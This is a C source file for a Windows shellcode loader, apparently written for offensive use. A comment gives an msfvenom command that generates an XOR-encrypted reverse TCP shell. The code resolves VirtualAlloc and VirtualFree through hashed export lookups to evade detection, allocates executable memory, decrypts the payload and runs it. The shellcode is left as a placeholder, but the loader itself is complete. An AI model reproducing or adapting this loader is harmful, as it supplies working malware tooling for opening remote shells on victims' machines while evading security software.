#include <stdio.h>
#include <string.h>
#include <windows.h>

//msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=8000 -f c --encrypt xor --encrypt-key "XorEncryptedShellcode"

DWORD HashOfFunctions[] = {99236, 49605};

typedef BOOL (WINAPI *VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
typedef BOOL (WINAPI *VirtualFree_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);

unsigned char buf[] = 
"ENCRYPTED-SHELLCODE-GOES-HERE";

const char key[] = "XorEncryptedShellcode";

DWORD CreateHash(const char *str)
{
	DWORD Hash = 0;
	while (*str != '\0' && *str != '\n')
	{
		Hash = (Hash * 2) + (2 ^ *str);
		str++;
	}
	Hash = Hash / 4;
	return Hash;
}

FARPROC GetProcAddressByHash(HMODULE Module, DWORD Hash)
{
	unsigned char *BaseAddress = (unsigned char *)Module;

	IMAGE_DOS_HEADER *DOSHeader = (IMAGE_DOS_HEADER *)BaseAddress;
	if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("[-] Error: e_magic not valid!\n");
		return NULL;
	}

	IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(BaseAddress + DOSHeader->e_lfanew);
	if (NTHeaders->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("[-] Error: Not a valid PE\n");
		return NULL;
	}

	IMAGE_DATA_DIRECTORY ExportDataDir = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (ExportDataDir.VirtualAddress == 0)
	{
		printf("[-] Error: Export Table missing!\n");
		return NULL;
	}

	IMAGE_EXPORT_DIRECTORY *ExportDir = (IMAGE_EXPORT_DIRECTORY *)(BaseAddress + ExportDataDir.VirtualAddress);

	DWORD *FunctionRVAs = (DWORD *)(BaseAddress + ExportDir->AddressOfFunctions);
	DWORD *NameRVAs = (DWORD *)(BaseAddress + ExportDir->AddressOfNames);
	WORD *NameOrdinals = (WORD *)(BaseAddress + ExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < ExportDir->NumberOfNames; i++)
	{
		char *FunctionName = (char *)(BaseAddress + NameRVAs[i]);
		DWORD CurrentHash = CreateHash(FunctionName);

		if (CurrentHash == Hash)
		{
			WORD Ordinal = NameOrdinals[i];
			DWORD FuncRVA = FunctionRVAs[Ordinal];
			FARPROC FunctionAddress = (FARPROC)(BaseAddress + FuncRVA);
			return FunctionAddress;
		}
	}

	return NULL;
}

int main()
{
	size_t buflen = sizeof(buf) - 1;

	HMODULE Kernel32 = GetModuleHandleA("kernel32.dll");
	if (Kernel32 == NULL)
	{
		printf("[-] Failed to get handle for kernel32.dll: %ld\n", GetLastError());
		return 1;
	}

	unsigned char *BAddr = (unsigned char *)Kernel32;
	printf("[+] Base address of kernel32.dll: 0x%p\n", BAddr);

	VirtualAlloc_t pVirtualAlloc = NULL;
	VirtualFree_t pVirtualFree = NULL;

	for (int i = 0; i < sizeof(HashOfFunctions) / sizeof(HashOfFunctions[0]); i++)
	{
		FARPROC func = GetProcAddressByHash(Kernel32, HashOfFunctions[i]);
		if (func == NULL)
		{
			printf("[-] Failed to resolve function for hash: %ld\n", HashOfFunctions[i]);
			return 1;
		}

		if (i == 0) pVirtualAlloc = (VirtualAlloc_t)func;
		else if (i == 1) pVirtualFree = (VirtualFree_t)func;
	}

	if (!pVirtualAlloc || !pVirtualFree)
	{
		printf("[-] Error: Not all functions were resolved!\n");
		return 1;
	}

	LPVOID exec = pVirtualAlloc(NULL, buflen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!exec)
	{
		return 1;
	}

	size_t keylen = strlen(key);
	for (size_t i = 0; i < buflen; i++)
	{
		buf[i] ^= key[i % keylen];
	}

	memcpy(exec, buf, buflen);

	((void(*)())exec)();
	pVirtualFree(exec, 0, MEM_RELEASE);

	return 0;
}
